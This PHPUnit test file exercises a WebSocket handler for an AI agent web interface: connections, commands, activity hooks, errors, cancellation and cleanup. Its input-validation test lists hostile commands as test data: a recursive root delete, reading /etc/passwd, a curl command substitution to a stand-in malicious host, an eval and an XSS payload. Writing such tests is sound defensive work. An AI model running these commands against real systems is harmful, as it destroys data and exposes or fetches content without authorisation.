<?php

namespace Tests\Feature;

use App\Agent\Agent;
use App\Agent\Hooks;
use App\Commands\WebUIServer;
use App\Tools\ReadFileTool;
use App\Tools\WriteFileTool;
use App\WebSocket\AgentWebSocketHandler;
use Mockery;
use Ratchet\ConnectionInterface;
use ReflectionClass;
use Symfony\Component\Console\Output\BufferedOutput;
use Tests\TestCase;

class WebUIIntegrationTest extends TestCase
{
    private AgentWebSocketHandler $handler;

    private array $tools;

    private BufferedOutput $output;

    protected function setUp(): void
    {
        parent::setUp();

        $this->tools = [
            new ReadFileTool,
            new WriteFileTool('/tmp/test-output'),
        ];

        $this->output = new BufferedOutput;
        $this->handler = new AgentWebSocketHandler($this->tools, $this->output);
    }

    protected function tearDown(): void
    {
        Mockery::close();
        parent::tearDown();
    }

    public function test_full_websocket_connection_lifecycle()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'integration-test-123';

        // Track messages sent to connection
        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        // 1. Test connection open
        $this->handler->onOpen($mockConnection);

        // Verify connection and context messages were sent
        $this->assertCount(2, $sentMessages);
        $this->assertEquals('connection', $sentMessages[0]['type']);
        $this->assertEquals('connected', $sentMessages[0]['status']);
        $this->assertEquals('context', $sentMessages[1]['type']);
        $this->assertArrayHasKey('directory', $sentMessages[1]['data']);
        $this->assertArrayHasKey('files', $sentMessages[1]['data']);
        $this->assertArrayHasKey('capabilities', $sentMessages[1]['data']);

        // 2. Test status request
        $sentMessages = []; // Reset
        $statusMessage = json_encode(['type' => 'status']);
        $this->handler->onMessage($mockConnection, $statusMessage);

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('status', $sentMessages[0]['type']);
        $this->assertArrayHasKey('activeAgents', $sentMessages[0]);
        $this->assertArrayHasKey('connectedClients', $sentMessages[0]);

        // 3. Test command execution
        $sentMessages = []; // Reset
        $commandMessage = json_encode([
            'type' => 'command',
            'command' => 'Say hello world',
        ]);

        $this->handler->onMessage($mockConnection, $commandMessage);

        // Should have received task_started and either task_completed or task_failed
        $this->assertGreaterThanOrEqual(2, count($sentMessages));
        $this->assertEquals('task_started', $sentMessages[0]['type']);
        $this->assertEquals('Say hello world', $sentMessages[0]['command']);
        $this->assertArrayHasKey('taskId', $sentMessages[0]);

        $lastMessage = end($sentMessages);
        $this->assertContains($lastMessage['type'], ['task_completed', 'task_failed']);

        // 4. Test connection close
        $this->handler->onClose($mockConnection);

        // Verify connection was properly closed (no exceptions thrown)
        $this->assertTrue(true);
    }

    public function test_multiple_concurrent_connections()
    {
        $connections = [];
        $messageQueues = [];

        // Create multiple mock connections
        for ($i = 0; $i < 3; $i++) {
            $conn = Mockery::mock(ConnectionInterface::class);
            $conn->resourceId = "concurrent-test-{$i}";

            $messageQueues[$i] = [];
            $conn->shouldReceive('send')
                ->andReturnUsing(function ($message) use (&$messageQueues, $i) {
                    $messageQueues[$i][] = json_decode($message, true);

                    return true;
                });

            $connections[] = $conn;
        }

        // Connect all clients
        foreach ($connections as $conn) {
            $this->handler->onOpen($conn);
        }

        // Verify all connections received welcome messages
        foreach ($messageQueues as $queue) {
            $this->assertCount(2, $queue); // connection + context messages
            $this->assertEquals('connection', $queue[0]['type']);
            $this->assertEquals('context', $queue[1]['type']);
        }

        // Send commands from different connections
        $commands = [
            'List current directory',
            'Create a test file',
            'Check system status',
        ];

        foreach ($connections as $index => $conn) {
            $messageQueues[$index] = []; // Reset
            $commandMessage = json_encode([
                'type' => 'command',
                'command' => $commands[$index],
            ]);

            $this->handler->onMessage($conn, $commandMessage);
        }

        // Verify each connection got its own task responses
        foreach ($messageQueues as $index => $queue) {
            $this->assertGreaterThanOrEqual(1, count($queue));
            $this->assertEquals('task_started', $queue[0]['type']);
            $this->assertEquals($commands[$index], $queue[0]['command']);
        }

        // Test status request shows multiple active connections
        $statusConn = $connections[0];
        $messageQueues[0] = []; // Reset first queue
        $statusMessage = json_encode(['type' => 'status']);
        $this->handler->onMessage($statusConn, $statusMessage);

        $statusResponse = $messageQueues[0][0];
        $this->assertEquals('status', $statusResponse['type']);
        $this->assertGreaterThanOrEqual(3, $statusResponse['connectedClients']);

        // Close all connections
        foreach ($connections as $conn) {
            $this->handler->onClose($conn);
        }
    }

    public function test_real_time_activity_streaming()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'activity-test-456';

        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        // Connect and clear initial messages
        $this->handler->onOpen($mockConnection);
        $sentMessages = []; // Reset to focus on command execution messages

        // Create a command that should trigger multiple hook events
        $commandMessage = json_encode([
            'type' => 'command',
            'command' => 'Analyze this test scenario',
        ]);

        $this->handler->onMessage($mockConnection, $commandMessage);

        // Verify we got task_started message
        $this->assertGreaterThan(0, count($sentMessages));
        $taskStartedMsg = $sentMessages[0];
        $this->assertEquals('task_started', $taskStartedMsg['type']);
        $taskId = $taskStartedMsg['taskId'];

        // The handler creates hooks that should trigger activity messages
        // We can test the hooks directly
        $reflection = new ReflectionClass($this->handler);
        $hooksMethod = $reflection->getMethod('createHooksForConnection');
        $hooksMethod->setAccessible(true);

        $hooks = $hooksMethod->invoke($this->handler, $mockConnection, $taskId);

        // Clear messages and test hook triggers
        $sentMessages = [];

        // Trigger various hook events
        $hooks->trigger('start', 'Starting analysis');
        $hooks->trigger('iteration', 1);
        $hooks->trigger('thought', 'I need to analyze this scenario');
        $hooks->trigger('action', ['type' => 'analyze', 'target' => 'test']);
        $hooks->trigger('observation', 'Found interesting patterns');
        $hooks->trigger('tool_execution', 'ReadFileTool', ['file' => 'test.txt']);
        $hooks->trigger('final_answer', 'Analysis complete');

        // Verify activity messages were sent
        $this->assertEquals(7, count($sentMessages));

        $activityTypes = array_column($sentMessages, 'activity');
        $expectedActivities = ['start', 'iteration', 'thought', 'action', 'observation', 'tool_execution', 'final_answer'];

        $this->assertEquals($expectedActivities, $activityTypes);

        // Verify all messages have correct structure
        foreach ($sentMessages as $message) {
            $this->assertEquals('activity', $message['type']);
            $this->assertEquals($taskId, $message['taskId']);
            $this->assertArrayHasKey('timestamp', $message);
            $this->assertArrayHasKey('data', $message);
        }
    }

    public function test_error_handling_and_recovery()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'error-test-789';

        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        $this->handler->onOpen($mockConnection);

        // Test 1: Invalid JSON
        $sentMessages = []; // Reset
        $this->handler->onMessage($mockConnection, 'invalid json {');

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('error', $sentMessages[0]['type']);
        $this->assertArrayHasKey('error', $sentMessages[0]);

        // Test 2: Missing type field
        $sentMessages = []; // Reset
        $this->handler->onMessage($mockConnection, json_encode(['command' => 'test']));

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('error', $sentMessages[0]['type']);
        $this->assertEquals('Invalid message format', $sentMessages[0]['error']);

        // Test 3: Unknown message type
        $sentMessages = []; // Reset
        $this->handler->onMessage($mockConnection, json_encode(['type' => 'unknown_type']));

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('error', $sentMessages[0]['type']);
        $this->assertStringContainsString('Unknown message type: unknown_type', $sentMessages[0]['error']);

        // Test 4: Empty command
        $sentMessages = []; // Reset
        $this->handler->onMessage($mockConnection, json_encode(['type' => 'command', 'command' => '']));

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('error', $sentMessages[0]['type']);
        $this->assertEquals('Empty command', $sentMessages[0]['error']);

        // Test 5: Connection should still be functional after errors
        $sentMessages = []; // Reset
        $this->handler->onMessage($mockConnection, json_encode(['type' => 'status']));

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('status', $sentMessages[0]['type']);
        $this->assertArrayHasKey('activeAgents', $sentMessages[0]);
    }

    public function test_security_input_validation()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'security-test-999';

        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        $this->handler->onOpen($mockConnection);

        // Test malicious command injection attempts
        $maliciousCommands = [
            'rm -rf /',
            'cat /etc/passwd',
            '$(curl malicious-site.com)',
            'eval("dangerous_code()")',
            '<script>alert("xss")</script>',
        ];

        foreach ($maliciousCommands as $command) {
            $sentMessages = []; // Reset

            $commandMessage = json_encode([
                'type' => 'command',
                'command' => $command,
            ]);

            $this->handler->onMessage($mockConnection, $commandMessage);

            // Should still process the command but not execute it dangerously
            // The agent framework should handle security, but we verify the message structure is correct
            $this->assertGreaterThan(0, count($sentMessages));
            $this->assertEquals('task_started', $sentMessages[0]['type']);
            $this->assertEquals($command, $sentMessages[0]['command']);
        }

        // Test extremely long input
        $longCommand = str_repeat('A', 10000);
        $sentMessages = []; // Reset

        $commandMessage = json_encode([
            'type' => 'command',
            'command' => $longCommand,
        ]);

        $this->handler->onMessage($mockConnection, $commandMessage);

        // Should handle long input gracefully
        $this->assertGreaterThan(0, count($sentMessages));
        $this->assertEquals('task_started', $sentMessages[0]['type']);
    }

    public function test_task_cancellation_flow()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'cancel-test-111';

        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        $this->handler->onOpen($mockConnection);

        // Start a task
        $sentMessages = []; // Reset
        $commandMessage = json_encode([
            'type' => 'command',
            'command' => 'Long running task',
        ]);

        $this->handler->onMessage($mockConnection, $commandMessage);

        $this->assertGreaterThan(0, count($sentMessages));
        $taskId = $sentMessages[0]['taskId'];

        // Cancel the task
        $sentMessages = []; // Reset
        $cancelMessage = json_encode([
            'type' => 'cancel',
            'taskId' => $taskId,
        ]);

        $this->handler->onMessage($mockConnection, $cancelMessage);

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('task_cancelled', $sentMessages[0]['type']);
        $this->assertEquals($taskId, $sentMessages[0]['taskId']);

        // Test cancel without task ID
        $sentMessages = []; // Reset
        $cancelMessage = json_encode(['type' => 'cancel']);

        $this->handler->onMessage($mockConnection, $cancelMessage);

        $this->assertCount(1, $sentMessages);
        $this->assertEquals('task_cancelled', $sentMessages[0]['type']);
        $this->assertNull($sentMessages[0]['taskId']);
    }

    public function test_webui_server_command_integration()
    {
        $command = new WebUIServer;

        // Test that the command creates tools correctly
        $reflection = new ReflectionClass($command);
        $createToolsMethod = $reflection->getMethod('createTools');
        $createToolsMethod->setAccessible(true);

        $tools = $createToolsMethod->invoke($command);

        $this->assertIsArray($tools);
        $this->assertCount(6, $tools);

        // Test that these tools work with the WebSocket handler
        $handler = new AgentWebSocketHandler($tools, $this->output);

        $this->assertInstanceOf(AgentWebSocketHandler::class, $handler);

        // Verify tools are accessible
        $handlerReflection = new ReflectionClass($handler);
        $toolsProperty = $handlerReflection->getProperty('tools');
        $toolsProperty->setAccessible(true);
        $handlerTools = $toolsProperty->getValue($handler);

        $this->assertEquals($tools, $handlerTools);
    }

    public function test_context_information_accuracy()
    {
        $mockConnection = Mockery::mock(ConnectionInterface::class);
        $mockConnection->resourceId = 'context-test-222';

        $sentMessages = [];
        $mockConnection->shouldReceive('send')
            ->andReturnUsing(function ($message) use (&$sentMessages) {
                $sentMessages[] = json_decode($message, true);

                return true;
            });

        $this->handler->onOpen($mockConnection);

        // Check the context message
        $contextMessage = $sentMessages[1]; // Second message is context
        $this->assertEquals('context', $contextMessage['type']);

        $contextData = $contextMessage['data'];

        // Verify directory is current working directory
        $this->assertEquals(getcwd(), $contextData['directory']);

        // Verify files array exists and is array
        $this->assertIsArray($contextData['files']);

        // Verify capabilities match our tools
        $this->assertIsArray($contextData['capabilities']);
        $expectedCapabilities = ['read_file', 'write_file']; // Based on our test tools

        foreach ($expectedCapabilities as $capability) {
            $this->assertContains($capability, $contextData['capabilities']);
        }
    }

    public function test_connection_resource_cleanup()
    {
        $connections = [];

        // Create multiple connections
        for ($i = 0; $i < 5; $i++) {
            $conn = Mockery::mock(ConnectionInterface::class);
            $conn->resourceId = "cleanup-test-{$i}";
            $conn->shouldReceive('send')->andReturn(true);

            $connections[] = $conn;
            $this->handler->onOpen($conn);
        }

        // Verify all connections are tracked
        $reflection = new ReflectionClass($this->handler);
        $clientsProperty = $reflection->getProperty('clients');
        $clientsProperty->setAccessible(true);
        $clients = $clientsProperty->getValue($this->handler);

        $this->assertEquals(5, count($clients));

        // Close some connections
        for ($i = 0; $i < 3; $i++) {
            $this->handler->onClose($connections[$i]);
        }

        // Verify connections were removed
        $this->assertEquals(2, count($clients));

        // Close remaining connections
        for ($i = 3; $i < 5; $i++) {
            $this->handler->onClose($connections[$i]);
        }

        // Verify all connections cleaned up
        $this->assertEquals(0, count($clients));
    }
}
